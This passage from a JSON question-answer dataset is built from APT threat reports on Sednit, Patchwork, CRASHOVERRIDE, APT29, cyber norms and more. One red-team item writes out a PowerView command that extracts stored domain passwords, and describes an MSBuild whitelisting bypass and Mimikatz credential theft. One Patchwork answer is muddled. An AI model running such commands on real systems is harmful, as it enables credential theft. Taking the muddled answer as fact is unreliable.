    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Risk Assessment\nA backdoor is a method of bypassing normal authentication procedures. Once a system has been compromised, the attacker may install one or more backdoors.  These backdoors provide a persistent foothold; allowing easier access in the future.\nThis particular backdoor, lets the attacker obtain system information, connect to SQL databases, list tables and execute commands, browse directories, perform file manipulations (upload, download, copy, delete, modify, searches, etc.), and perform folder manipulations (delete, copy, etc.).\n\nQ: How does the backdoor installed by STTEAM maintain persistence within a compromised system, and what specific functionalities does it offer to the attacker?",
    "output": "A: The backdoor installed by STTEAM maintains persistence by bypassing normal authentication procedures, allowing the attacker to have easier access in the future. This particular backdoor offers several functionalities to the attacker, including obtaining system information, connecting to SQL databases to list tables and execute commands, browsing directories, performing various file manipulations (such as uploading, downloading, copying, deleting, modifying, and searching), and performing folder manipulations (like deleting and copying). These capabilities enable the attacker to maintain control over the compromised system and carry out further malicious activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Calypso APT\nThe PT Expert Security Center first took note of Calypso in March 2019 during threat hunting. Our specialists collected multiple samples of malware used by the group. They have also identified the organizations hit by the attackers, as well as the attackers' C2 servers.\nOur data indicates that the group has been active since at least September 2016. The primary goal of the group is theft of confidential data. Main targets are governmental institutions in Brazil, India, Kazakhstan, Russia, Thailand, and Turkey.\nOur data gives reason to believe that the APT group is of Asian origin.1\n1. See the section \"Attribution.\"\nRead the text above and answer this question: What factors led the PT Expert Security Center to attribute the Calypso APT group to an Asian origin? Explain how this attribution helps in understanding and mitigating future threats from similar groups.",
    "output": "The PT Expert Security Center attributed the Calypso APT group to an Asian origin based on data collected during their investigation. This attribution helps in understanding the geopolitical motivations and tactics, techniques, and procedures (TTPs) commonly used by Asian threat actors. By knowing the origin, cybersecurity experts can better anticipate potential targets, such as governmental institutions in specific countries like Brazil, India, Kazakhstan, Russia, Thailand, and Turkey. Additionally, it allows for tailored defensive strategies and improved threat intelligence sharing within the region, enhancing overall preparedness against similar attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: The Operators' Mistake\nDuring one of these phishing campaigns against webmail users, the operators used Bitly (<>)[12] to shorten the URLs contained in the emails. To do so, they created a few accounts on Bitly, and used each of them to shorten multiple phishing URLs. Luckily enough for us, one of those Bitly accounts was set as\"public\", which allows everyone to see the list of URLs that were shortened by this account, with the exact time at which they were shortened.\nThe public profile feature has been removed from Bitly (<>)[13], and hence the list is no longer available.\nInterestingly, each URL that was shortened contained the email address and the name of the target. Having this information in the URL allowed the fake login panel to display them easily, as shown in , rather than requiring an instance of the login panel for each target. An example of a URL that was shortened is shown below:\nhttp://login.accoounts-google.com/ url/?continue=cGFyZXBreWl2QGdtYWlsLmNvbQ==&df=UGFraXN0YW4rRW1iYXNzeStLeWl2&tel=1\nHere, the continue parameter contains parepkyiv@gmail.com encoded in base64, while the df parameter contains Pakistan+Embassy+Kyiv. Therefore, it is possible to identify the target precisely from a URL that was shortened, in this case the Pakistan Embassy in Kiev.\nMedium Headline: What Is in the List?\nThe list contains around 4,400 URLs that were shortened between 16th of March 2015 and 14th of September 2015. Assuming that the time at which a URL was shortened corresponds roughly to the moment when the corresponding phishing email was sent, it allows us to create a relatively accurate timeline of the events related to these phishing attacks.\nFirst, the number of URLs that were shortened per day is showed in Figure 5 for the first (and most active) two months of the account's activity.\nThere were regular peaks in the number of URLs that were shortened, usually Monday or Friday, probably corresponding to the launch of new phishing campaigns. Also, there is almost no activity during the weekends indicating that the operators are likely to work only on weekdays.\nSecondly, the same target may appear in several URLs, probably corresponding to repeated phishing attempts. The list contains 1,888 unique target email addresses, most of them being Gmail addresses. Figure 6 shows the number of times the targets were attacked.\nMore than half of the targets were attacked only once, and in most of these cases the corresponding shortened URL was clicked at least once, according to the Bitly statistics. On the other hand, the others targets have been attacked several times during the six months of data, with a maximum of seven attempts against nine of them. Most of the corresponding shortened URLs were not visited. In other words, the targets are regularly attacked until an attempt to phish succeeds, and for more than half of the targets one attempt was enough.\nThe number of clicks on a Bitly-shortened URL is publicly available, by appending a\"+\" to the shortened URL, with the countries from which those clicks originated. Nevertheless, one can not know whether a shortened URL was visited by the intended target, or someone else.\nFinally, since we know the exact time when a URL was shortened, we can display the hour of the day when it happened, as shown in Figure 7.\nInterestingly, the distribution of the hours matches the working hours from 9AM to 5PM in the UTC+3 time zone, with sometimes some activity in the evening. This may indicate that the operators work from this time zone (<>)[14].\nMedium Headline: What Kind of Targets?\nAs the list contains mostly Gmail addresses, the majority of the targeted emails belong to individuals. Nevertheless, the following organizations also have Gmail addresses that were targeted:\n\u2022 Embassies belonging to Algeria, Brazil, Colombia, Djibouti, India, Iraq, North Korea, Kyrgyzstan, Lebanon, Myanmar, Pakistan, South Africa, Turkmenistan, United Arab Emirates, Uzbekistan and Zambia\n\u2022 Ministries of Defense in Argentina, Bangladesh, South Korea, Turkey and Ukraine\nRegarding the individuals targeted, here are a few of their positions that are typical of the list:\n\u2022 Political leaders and heads of police of Ukraine\n\u2022 Members of NATO institutions\n\u2022 Members of the People's Freedom Party, a Russian liberal democratic political party (<>)[15]\n\u2022 Russian political dissidents\n\u2022 \"Shaltay Boltai\", an anonymous Russian group known to release private emails of Russian politicians (<>)[16]\n\u2022 Journalists located in Eastern Europe\n\u2022 Academics visiting Russian universities\n\u2022 Chechen organizations\nOverall, most of the targets we could identify are related by the fact that they all share the same standpoint in the current political situation in Eastern Europe.\nWhile this list only provides a partial view of the Sednit group's targets, another list was analyzed by Trend Micro, with similar findings (<>)[17].\n\nQ: How did the Sednit group's use of Bitly for URL shortening provide valuable insights into their phishing campaign strategies?",
    "output": "A: The Sednit group used Bitly to shorten URLs for their phishing campaigns, and one of their Bitly accounts was set to 'public', allowing researchers to access the list of shortened URLs along with the exact times they were created. Each URL contained the email address and name of the target, enabling precise identification of the targets. For example, a URL might contain parameters like 'parepkyiv@gmail.com' and 'Pakistan+Embassy+Kyiv' encoded in base64. This information helped researchers understand the targets and the timing of the phishing campaigns, revealing that the operators worked mainly during weekdays and within the UTC+3 time zone.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: CONTENT\nIn late 2014, we published  in 2015. Four of the nine predictions we made were directly connected with threats to businesses. Our predictions proved accurate \u2013 three of the four business-related threats have already been fulfilled:\n\u2022 Cybercriminals embrace APT tactics for targeted attacks \u2013 yes.\n\u2022 APT groups fragment, diversify attacks \u2013 yes.\n\u2022 Escalation of ATM and PoS attacks \u2013 yes.\n\u2022 Attacks against virtual payment systems \u2013 no.\nLet's have a look back at the major incidents of 2015 and at the new trends we have observed in information security within the business environment.\nQ: Why did cybercriminals adopt Advanced Persistent Threat (APT) tactics for targeted attacks in 2015, and how did this adoption impact the corporate sector?",
    "output": "Cybercriminals adopted APT tactics for targeted attacks in 2015 because these methods allow for more sophisticated and sustained intrusions into corporate networks. By using APT tactics, cybercriminals could better evade detection and gain deeper access to sensitive information over extended periods. This adoption significantly impacted the corporate sector by increasing the complexity and severity of cyber threats, making it more challenging for businesses to defend against these advanced attacks. As a result, companies had to enhance their security measures and invest in more robust defense strategies to protect against such persistent and targeted threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: CONCLUSIONS\nPatchwork is a highly successful targeted attack operation, infecting approximately 2,500 high-value targets worldwide. It is surprising that it has remained undetected since its operations began in December, as it seems to have been built out of a confluence of code taken from various public and hidden criminal forums, as well as various open source projects.\nWhat makes this disclosure special is the use of Cymmetria's cyber deception platform19 to catch the threat actor, capturing their second stage toolset and lateral movement activity. Without deception, capturing second-stage tools and activity has previously been difficult (to say the least).\nThe high degree of operational capacity stands in stark contradiction to the low technical ability displayed, which raises the question of whether the copy-paste nature of the threat was potentially intentional, perhaps an evolution of threat actors attempting to avoid the high cost of losing their expensive tool box and malware when they are eventually publically disclosed. This, however, seems unlikely, as the use of such second-hand code is consistent with their second stage toolset meant for persistence, which should typically be built to resist detection.\nWhile one can almost never be conclusive in attribution, based on the information we have it is plausible that the threat actor is a pro-Indian one. As our CEO Gadi Evron said in an internal discussion, \"There is a possibility that another threat actor wanted to look like India and built a false flag operation to fit, but there is zero evidence to support that claim, and it feels like we're reaching just to attack our own argument.\"\nUnlike other APT threat actors, India seems to be a relatively quiet locale for cyber espionage activity, if indeed this is a pro-Indian threat actor, it is noteworthy by itself. The scope and scale of this operation are quite surprising considering the low technical capability displayed, which we believe is a growing trend seen among disparate threat actors.\n19 Cymmetria's MazeRunner\n\nQ: Why was Patchwork, despite its low technical sophistication, able to successfully infect approximately 2,500 high-value targets worldwide without being detected for several months? Discuss the potential reasons behind this phenomenon and how it reflects on the evolving strategies of threat actors.",
    "output": "A: Patchwork was able to successfully infect approximately 2,500 high-value targets worldwide without being detected for several months due to a combination of factors. One key reason is that the operation was built out of a confluence of code taken from various public and hidden criminal forums, as well as various open source projects. This 'copy-paste' nature of the threat might have been intentional, potentially as an attempt to avoid the high cost of losing their expensive toolbox and malware when they are eventually publicly disclosed. However, this seems unlikely because the use of such second-hand code is consistent with their second stage toolset meant for persistence, which should typically be built to resist detection. Another factor is the use of Cymmetria's cyber deception platform, which captured the threat actor's second stage toolset and lateral movement activity. Without deception, capturing second-stage tools and activity has previously been difficult. This highlights the growing trend among disparate threat actors who are achieving significant operational success despite displaying low technical capability.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nSmall Headline: 3 Norms and the Application of International Law4\nRussia's activities in Ukraine have implications for both cyber warfare and for cyber norms. Russian actions have carved new contours for conflict that do not map perfectly to existing concepts and rules for warfare and defence. Existing norms and laws for armed attack were based on the use or threat of use of physical violence and force. These must be adjusted, if not amended, for cyber conflict.\nEfforts to redefine violence and force to include the full range of possible cyber actions (such as Russian and Chinese efforts in the United Nations (UN) to define information as a weapon5) have so far introduced more ambiguity than clarity. Information is clearly not a weapon, but a minimalist definition that emphasises kinetic effect is also inadequate in capturing the full range of cyber effects.\nThe 'rules' for cyber conflict pose a challenge to existing international law.\nAs such, the 'rules' for cyber conflict pose a challenge to existing international law. Currently, there is no agreement among leading nations, and it is interesting to note that with the 2015 Group of Governmental Experts (GGE), which was tasked to look at the application of international law to cyber conflict,6 this topic proved to be the most difficult. Disagreements over the application of international law between Russia, China and a few others on one hand, and NATO nations on the other, almost derailed the talks.\nThe crux of the disagreement was over the application of specific provisions of the UN Charter, (the general applicability of the Charter had been agreed to in earlier GGEs), and in particular the applicability of Article 2/4 (renouncing the use of force) and Article 51 (the inherent right to self-defence). One question for the development of further norms for cyber conflict becomes whether it is possible to move beyond the norms embedded in the UN Charter and the international agreements governing the conduct of warfare and armed conflict, to address this new aspect of warfare and to create norms that govern non-ki-\nnetic action. One possible avenue for progress would be to expand the Charter commitment to avoid actions that threaten the territorial integrity or political independence of a state (found in Articles 2/4 and 51) to explicitly include cyber actions.\n4 The author was rapporteur to the UN Group of Governmental Experts in 2010, 2013 and 2015.\n5 See, for example, SCO, Agreement between the Governments of the Member States of the Shanghai Cooperation Organisation on Cooperation in the Field of International Information Security, 2009, https://ccdcoe.org/sites/default/files/documents/ SCO-090616-IISAgreementRussian.pdf [in Russian].\n6 Along with norms and confidence building measures, see Group of Governmental Experts Report on Developments in the Field of Information and Telecommunications in the Context of International Security, A/70/174, 22 July 2015, UNODA, (<http://www.un.org/ga/search/view_doc.asp?symbol=A/70/174>)http://www. (<http://www.un.org/ga/search/view_doc.asp?symbol=A/70/174>)un.org/ga/search/view_doc.asp?symbol=A/70/174.\nContinued ambiguity over the application of these UN Charter articles serves the interests of Russia and China by not creating grounds for or legitimising retaliation for cyber actions.7 This includes a general rejection of Western efforts to define 'use of force' and 'armed attack' using the concepts of equivalence and effect. These ambiguities, however, are not unique to cyber conflict, date from the signing of the Charter, and reflect conflicting desires to renounce the use of force while preserving the right to use force in self-defence. The Russian and Chinese goal, similar to other actions in arms control negotiations by these countries, is to constrain the U.S. and its allies.\nIntentional ambiguity may define the emerging strategic conflict between Russia and the West for the foreseeable future. Russian cyber tactics accentuate and expand ambiguity. The Russian concept of cyber warfare blends elements of what would be considered information warfare in the West. It is well known that the Russians prefer to use the phrase 'information conflict' to 'cyber conflict' on the grounds that cyber is too narrow and technical. Unsurprisingly, this preference reflects their use and understanding of cyber techniques.\nThe norms before the UN General Assembly for approval at its 70th session will reiterate the rule of international law and the UN Charter, although how these are to be applied is a matter of intense dispute. They call for states not to attack critical infrastructure in peacetime, and to take note of the principles of humanity, necessity, proportionality, and distinction whey they exercise their inherent rights rec-ognised by the UN Charter, including the right of self-defence. They do not address the use of cyber tools for political coercion, and it is interesting and indicative to note that Russia, which has made the most frequent use of cyber coercion, is the leading proponent for such norms.\nState practice suggests that there is an implicit threshold among states to avoid cyber actions against each other that could be interpreted as the use of force or an armed attack. This creates implicit norms for state behaviour derived from international practice that constrain malicious cyber actions, but these implicit norms are inadequate for this new form of conflict. The kind of cyber conflict we have seen in Ukraine poses a challenge not only to existing Western strategy (which is based on international law and UN Charter commitments) but also for the development of norms. If the trend in warfare is to circumvent direct confrontation between conventional forces (particularly the conventional forces of the U.S. and its allies), and if cyber conflict will often not involve kinetic effect or territorial intrusions, existing norms and rules for conflict will have limited application.\n7 According to conversations between the author and GGE representatives from many countries.\nWe can place cyber norms into four categories:\n\u2022 Those that call for observation of existing international law regarding state responsibility, especially the laws of armed conflict;\n\u2022 Those that seek to exempt from cyber attack infrastructures where an attack could have an indiscriminate effect such as critical infrastructures, including the infrastructure of the global internet;\n\u2022 Norms on state responsibilities to assist other states that are the victim of cyber attacks; and\n\u2022 Norms on the proliferation of cyber technologies that could be used for malevolent purposes (which is still nascent and suffers from definitional problems).\nNone of these norms can be easily extended to the new modes of coercion created by cyber capabilities. The stricture that comes closest is the Article 2/4 commitment to refrain from the use of force against the political independence of another state, but cyber actions such as we have seen in Ukraine cannot be considered a use of force.\nNations appear to observe an implicit threshold for their use of cyber tools.\nCyber actions that do not have physical effect and which are taken outside the context of formal conflict do not fit well with the existing structure of international practice. Nations appear to observe an implicit threshold for their use of cyber tools and with very few exceptions, have avoided actions that could be considered under international law as a use of force or an armed attack. Attempts to expand these implicit understandings or to redefine the use of force to include coercive or politically manipulative cyber actions immediately run into problems. The central problem is access to information, because several countries would happily support a norm that restricts access to information.\nRussia, in particular, is quick to label any criticism of its behaviour as disinformation, information warfare, or propaganda. Russian negotiating behaviour, shaped in good measure by Soviet precedent, is often defensive, seeking to constrain the U.S. and its allies in areas where the West has a technological advantage, or to limit the political risks the internet creates. This defensive orientation creates a negotiating agenda that conflicts with Western countries when it comes to norms.\n\nHow does the Russian approach to cyber norms and negotiations differ from that of Western countries, and what underlying motivations drive these differences?",
    "output": "Russia's approach to cyber norms and negotiations is often defensive, shaped by Soviet precedent, and aimed at constraining the U.S. and its allies in areas where the West has a technological advantage. Russia seeks to limit the political risks the internet creates and is quick to label criticisms of its behavior as disinformation or propaganda. This defensive orientation conflicts with the agenda of Western countries regarding norms. Underlying motivations for Russia include maintaining control over information and limiting the influence of Western technological superiority.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Figure 20. PowerView function to grab userPassword field and decode it.\nget-netuser -Domain <REDACTEDDOMAIN> -Filter userpassword=* | select -expandproperty userpassword | %{[char][int]$_} | write-host -nonewline}; write-host\nFigure 21. Example userPassword attribute with stored Unicode password.\n3  Available at https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1.\nWith domain credentials, the red team was able to move laterally to additional systems in the environment. At this stage, the red team encountered a significant number of servers using Device Guard with constrained language mode enabled and application whitelisting. There are several ways to bypass Device Guard and application whitelisting, one of which is the built-in Microsoft signed executable \"MSBuild.exe\". Using signed executables allowed Mandiant to bypass application whitelisting by executing payloads in the context of a Microsoft signed process. Using the open source script PowerLessShell,4 Mandiant's red team executed PowerShell scripts and payloads without launching \"PowerShell.exe\" directly. With this tool, Mandiant generated a \"csproj\" file containing the payload and copied it to a new system. Mandiant could then use WMI commands to remotely execute MSBuild, which, in turn, executed the malicious \"csproj\" payload.\nMandiant used credentials from the \"userPassword\" field to access systems containing domain administrator sessions and used Mimikatz to read LSASS memory and obtain clear text credentials for a domain administrator account.\nA jump server is a special-purpose computer that is hardened against attack and provides remote access to systems in a different network security zone.\n\nQuestion: How did Mandiant's red team bypass Device Guard and application whitelisting during their operations? Explain the methodology and tools used.\n\nAnswer:",
    "output": "Mandiant's red team utilized the built-in Microsoft signed executable 'MSBuild.exe' to bypass Device Guard and application whitelisting. This approach allowed them to execute payloads within the context of a Microsoft signed process, effectively circumventing the security measures. They employed the open-source script PowerLessShell to execute PowerShell scripts and payloads without directly launching 'PowerShell.exe'. The process involved generating a 'csproj' file containing the payload and copying it to a new system. Subsequently, they used WMI commands to remotely execute MSBuild, which then ran the malicious 'csproj' payload.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What is the 'sequence' attack option in CRASHOVERRIDE, and how does it affect substation operations and recovery efforts?",
    "output": "The 'sequence' attack option in CRASHOVERRIDE involves polling the target device for appropriate addresses and then toggling the value to open closed breakers. This creates an infinite loop that continues to set addresses to this value, effectively de-energizing the substation line(s) and preventing system operators from managing the breakers and re-energizing the line(s). Remote staff will lose control of the breakers and will need to send crews to the substation, potentially resulting in a few hours of outages if the CRASHOVERRIDE loop continues unabated.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does APT29's use of domain fronting with TOR, specifically through the meek plugin, relate to data obfuscation techniques used to evade detection?",
    "output": "Data obfuscation refers to the practice of hiding or disguising data to make it more difficult to detect or decipher. In the context of APT29's use of domain fronting with TOR, the meek plugin employs data obfuscation techniques to evade detection. Specifically, meek encodes TOR traffic into HTTP, wraps it in a legitimate TLS connection to a server hosted in the same CDN cloud as the reflection server, and uses the TLS service and cipher suites used by Firefox to further obfuscate traffic. This multi-stage process creates an outbound network connection that appears to contain normal HTTPS POST requests, making it extremely difficult to differentiate from legitimate connections. By using data obfuscation in this way, APT29 can effectively hide its command and control traffic, making it more challenging for network analysts to detect. This is a clear example of how data obfuscation can be used to evade detection, as described in the data obfuscation description.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Iran: a \"hot\" cyber war\nWherever significant activity erupts in the real world (including crime, espionage, and warfare), parallel activity unfolds in cyberspace. It is therefore unsurprising that Iran\u2014which has tense international relations and is on the verge of acquiring a nuclear bomb\u2014has also experienced the most sophisticated cyber attacks to date.\nIn 2010, Stuxnet was a \"cyber missile\" of sorts designed with painstaking precision to burrow deep into Iran's nuclear program and destroy physical infrastructure. To some degree, this piece of software replaced a squadron of fighter aircraft that would have violated foreign airspace, dropped laser-guided bombs, and left a smoking crater in the Earth's surface.52 Beyond Stuxnet, other advanced espionage attacks have worried security experts, including Duqu, Flame, and Gauss, which all may have come from the same threat actor.53 And even amateurs are successfully targeting Iran; although the \"Mahdi\" malware is by comparison far less sophisticated than Stuxnet and its cousins, Mahdi has still managed to compromise engineering firms, government agencies, financial services firms, and academia throughout the Middle East.54\n52 Sanger, D. Confront and Conceal. (New York: 2012) pp. 188-225.\n53 Boldizs\u00e1r Bencs\u00e1th. \"Duqu, Flame, Gauss: Followers of Stuxnet,\" BME CrySyS Lab, RSA 2012.\n54 Simonite, T. (31 Aug 2012) \"Bungling Cyber Spy Stalks Iran,\" MIT Technology Review.\nSo how does anyone, including a nation-state, respond to a cyber attack? Does the counterstrike remain within the cyber realm, or can it come in the form of a traditional military (or terrorist) assault? In 2012, Iran appears to have chosen the first option. A hacker group called the \"Cutting Sword of Justice\" used the \"Shamoon\" virus to attack the Saudi Arabian national oil company Aramco, deleting data on three-quarters of Aramco's corporate PCs (including documents, spreadsheets, e-mails, and files) and replacing them with an image of a burning American flag.55 And over the past year, another group called Izz ad-Din al-Qassam launched \"Operation Ababil,\" a series of DDoS attacks against many U.S. financial institutions including the New York Stock Exchange.56\nOther examples of cyber attacks abound. In 2009, the plans for a new U.S. Marine Corps 1 presidential helicopter were found on a file-sharing network in Iran.57 In 2010, the \"Iranian Cyber Army\" disrupted Twitter and the Chinese search engine Baidu, redirecting users to Iranian political messages.58 In 2011, Iranian attackers compromised a Dutch digital certificate authority, after which it issued more than 500 fraudulent certificates for major companies and government agencies.59 In 2012, Iran disrupted the BBC's Persian Language Service, and University of Toronto researchers reported that some versions of the Simurgh \"proxy\" software (which is popular in countries like Iran and anonymizes Internet traffic) also installed a Trojan that collected usernames and keystrokes, sending them to a likely intelligence collection site.60 Finally, in 2013 the Wall Street Journal reported that Iranian actors had increased their efforts to compromise U.S. critical infrastructure.61\nMedium Headline: Syria: what is the Syrian Electronic Army?\nSyria is in the midst of a civil war, so researchers have a lot of cyber activity to analyze. The most prominent hacker group by far is the Syrian Electronic Army (SEA), which is loyal to Syrian President Bashar al-Assad. SEA has conducted DDoS attacks, phishing, pro-Assad defacements, and spamming campaigns against governments, online services, and media that are perceived to be hostile to the Syrian government. SEA has hacked Al-Jazeera, Anonymous, Associated Press (AP), BBC, Daily Telegraph, Financial Times, Guardian, Human Rights Watch, National Public Radio, The New York Times, Twitter, and more.62 Its most famous exploit was a hoax announcement using AP's Twitter account that the White House was bombed and President Obama injured\u2014after which stock markets briefly dipped to the tune of $200 billion.63\n55 Perlroth, N. (23 Oct 2012) \"In Cyberattack on Saudi Firm, U.S. Sees Iran Firing Back,\" The New York Times.\n56 Walker, D. (8 Mar 2013) \"Hacktivists plan to resume DDoS campaign against U.S. banks,\" SC Magazine.\n57 Borak, D. (3 Mar 2009) \"Source in Iran views Marine One blueprints,\" Marine Corps Times.\n58 Wai-yin Kwok, V. (13 Jan 2010) \"Baidu Hijacked By Cyber Army,\" Forbes.\n59 Charette, R. (9 Sep 2011) \"DigiNotar Certificate Authority Breach Crashes e-Government in the Netherlands,\" IEEE Spectrum.\n61 Gorman, S. & Yadron, D. (23 May 2013) \"Iran Hacks Energy Firms, U.S. Says,\" Wall Street Journal.\n62 Fisher, M. & Keller, J. (31 Aug 2011) \"Syria's Digital Counter-Revolutionaries.\" The Atlantic; \"Syrian Electronic Army,\" (accessed 25 July, 2013) Wikipedia.\n60 \"Iranian anti-censorship software 'Simurgh' circulated with malicious backdoor,\" (25 May 2012) Citizenlab.\n63 Manzoor, S. (25 July, 2013) \"Slaves to the algorithm: Are stock market math geniuses, or quants, a force for good?\" The Sunday Telegraph.\nIn the month of July 2013 alone, SEA compromised three widely used online communications websites: Truecaller (the world's largest telephone directory),64 Tango (a video and text messaging service),65 and Viber (a free online calling and messaging application).66 These types of compromises are significant because they can give Syrian intelligence access to the communications of millions of people, including political activists within Syria who might then be targeted for espionage, intimidation, and arrest.\nTo compromise its targets, the SEA often sends socially engineered, spear-phishing emails to lure opposition activists into opening fraudulent, weaponized, and malicious documents. If the recipient falls for the scam, Trojan horse, remote access tool (RAT) software is installed on the victim's computer that can give the attacker keystrokes, screenshots, microphone and webcam recordings, stolen documents, and passwords. And of course, the SEA likely sends all of this information to a computer address lying within Syrian government-controlled Internet Protocol (IP) space for intelligence collection and review.67\nMedium Headline: Israel: old conflict, new tactics\nEven during the Cold War, the Arab-Israeli conflict saw many hot wars, and it was often the testing ground for new military weapons and tactics. Nothing has changed in the Internet era. Since at least 2000, pro-Israeli hackers have targeted sites of political and military significance in the Middle East.68 In 2007, Israel reportedly disrupted Syrian air defense networks via cyber attack (with some collateral damage to its own domestic networks) to facilitate the Israeli Air Force's destruction of an alleged Syrian nuclear facility.69\n64 Khare, A. (19 July 2013) \"Syrian Electronic Army Hacks Truecaller Database, Gains Access Codes to Social Media Accounts.\" iDigital Times.\n65 Kastrenakes, J. (22 July 2013) \"Syrian Electronic Army alleges stealing 'millions' of phone numbers from chat app Tango.\" The Verge; Albanesius, C. (23 July 2013) \"Tango Messaging App Targeted by Syrian Electronic Army.\" PCMag.\n66 Ashford, W. (24 July 2013) \"Syrian hacktvists hit second mobile app in a week.\" Computer Weekly.\n67 Tsukayama, H. (28 Aug 2013) \"Attacks like the one against the New York Times should put consumers on alert,\" The Washington Post.\n68 Geers K. (2008) \"Cyberspace and the Changing Nature of Warfare,\" Hakin9 E-Book, 19(3) No. 6; SC Magazine (27 AUG 08) 1-12.\n69 Carroll, W. (26 Nov 2007) \"Israel's Cyber Shot at Syria,\" Defense Tech.\nBut as an advanced industrial nation, Israel also depends on information technology. The nation has proven to be vulnerable to cyber attacks, which often target the Israeli economy. In 2009, during Israel's military operation in Gaza, hackers briefly paralyzed many government sites with a DDoS attack from at least 500,000 computers. The 2009 attack consisted of four independent waves, each stronger than the last, peaking at 15 million junk mail deliveries per second. The Israeli \"Home Front Command\" website, which plays a key role in national defense communications with the public, was down for three hours. Due to technical similarities with the 2008 cyber attack on Georgia during its war with Russia, Israeli officials surmised that the attack itself might have been carried out by a criminal organization in the former Soviet Union, and paid for by Hamas or Hezbollah.70\nOften, the trouble with cyber attacks is that they do not need to be highly sophisticated to succeed, even against security-conscious Israel. In 2012, the ineptly written71 \"Mahdi\" malware compromised at least 54 targets in Israel.72 Last but not least, in 2013, the Iranian media reported that the Syrian army had carried out a cyber attack against the water supply of the Israeli city of Haifa. Prof. Isaac Ben-Israel, a cyber security adviser to Prime Minister Benjamin Netanyahu, said that the report was false, but added that cyber attacks on critical infrastructures pose a \"real and present threat\" to Israel.73\n\nHow did the Stuxnet malware differ from traditional military operations, and what was its intended target in Iran?",
    "output": "A: Stuxnet was a highly sophisticated piece of malware designed to specifically target and destroy physical infrastructure within Iran's nuclear program. Unlike traditional military operations that involve physical force and potential collateral damage, Stuxnet acted as a 'cyber missile,' burrowing deep into the nuclear facilities to sabotage them. This approach replaced the need for a squadron of fighter aircraft and laser-guided bombs, making it a precise and covert alternative to conventional military action.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: SLServer Malware Family\ny The SLServer sample we received was also recently analyzed and reported by (<http://pwc.blogs.com/cyber_security_updates/2016/03/taiwant-election-targetting.html>)PwC. It was presented in an overview of threat actors making use of the recent Taiwanese presidential election in email lures to entice targets to open malicious documents. As noted by PwC, this file is a self\u00adextracting archive ultimately responsible for downloading a binary from a website that was likely compromised. Like PwC, we were unable to obtain the final Keyainst.exe binary due to the behaviour of the C2 during the time of analysis.\nAnother recently observed instance of this malware found on VirusTotal (MD5: (<https://virustotal.com/en/file/83f967523fb0904cb14ced4e84d1f299c51ff7f33a2a68348dac47e06f3fa2d2/analysis/>)cfcd2a90e87156e1a811f9c7b0051002) was designed to communicate with the same C2 server and contains the following debug path:\ne:\\Working\\SVNProject\\SLServer\\SLServer2.0\\release\\SLServer.pdb\nInterestingly, according to VirusTotal, the previously mentioned UP007 dropper fzyy.exe was also observed hosted as wthk.txt at the same URL as this downloaded SLServer sample. The precise timeframes during which these samples were hosted and changed remains unknown. Table 6 shows the timestamps of their initial upload to VirusTotal.\nBig Headline: SLServer \u2013 Possible Second Stage\nThe SLServer sample (MD5: (<https://virustotal.com/en/file/4018b934ee0ccdd0e469e56acadc66e2d5c11260f35340a6560c2db91f4e3612/analysis/>)e5e7dcbda781dd0bf5f5da3cccdb094d) calls \"FunctionWork\" from a DLL:\nOn VirusTotal we discovered a file named javaupdata.dll (MD5: (<https://virustotal.com/en/file/5b598a760115ecc3bc972e808fc8550682e527f2d1352acef5fc6baada31916a/analysis/>)<7332245f67b6b8a256ab22a6496b4536), which exports a function by the same name. Strings in the SLServer sample also reference a file by this name. When executed, this DLL contacts 210.61.12[.]153 using SSL. This host is the same one pointed to by the SLServer's C2 domain, safetyssl.security-centers[.]com. Interestingly, while the 210.61.12[.]153 host did not respond to the SLServer connections during analysis time, the host did accept the SSL connections from javaupdata.dll. Further analysis of this file is ongoing.\nBig Headline: SLServer Command and Control Infrastructure\nThe SLServer C2 server: safetyssl.security-centers[.]com resolved to the IP address: 210.61.12[.]153 at the time of analysis. This IP is hosted in Taiwan on the hosting provider (<http://www.cht.com.tw/en/aboutus/aboutcht.html>)Chunghwa Telecom, specifically their Data Communication Business Group offering. It appears to host the site of a Taiwanese auto parts manufacturer, Yowjung Autoparts. This site may have been either compromised or copied from a legitimate source.\nThe domain name security-centers.com (<https://whois.domaintools.com/security-centers.com>)was registered on September 11 2015 by the e\u00admails: janmiller-domain@googlemail[.]com and an_ardyth@123mail[.]org. Using Passive DNS data we find the following subdomains were used in the time period after domain registration:\nsafetyssl.security-centers[.]com computer.security-centers[.]com security-centers[.]com www.security-centers[.]com\nThe domain computer.security-centers[.]com was a C2 server previously reported by (<https://www.arbornetworks.com/blog/asert/wp-content/uploads/2016/01/ASERT-Threat-Intelligence-Brief-2015-08-Uncovering-the-Seven-Pointed-Dagger.pdf>)ASERT related to a sample of the Trochilus RAT analyzed in the report. ASERT retrieved that sample from the compromised Myanmar Union Election Commission website. The other subdomains (www and the the top level security-centers[.]com) are likely the default IP addresses for GoDaddy registered domains. The hosting information for this infrastructure is presented in the Figure 7.\nMedium Headline: Recent Campaign Connections\nIn January 2016, Arbor Networks released a report titled \"(<http://www.arbornetworks.com/blog/asert/uncovering-the-seven-pointed-dagger/>)Uncovering the Seven Pointed Dagger\" in which they discuss a series of six RAR files hosted on the Myanmar election commission website on 20 October 2015. The focus of the report was on the discovery of the new Trochilus RAT. However, one of the RAR files was noted as unknown malware. This sample (Security-Patch-Update.exe, MD5: 82896b68314d108141728a4112618304) is also UP007, signed with the 5D 11 78 4F B8 17 65 02 3F 89 A4 F4 24 3F E1 A9 certificate and configured to communicate with 59.188.12[.]123 directly over port 8008, identical to fzyy.exe mentioned above. 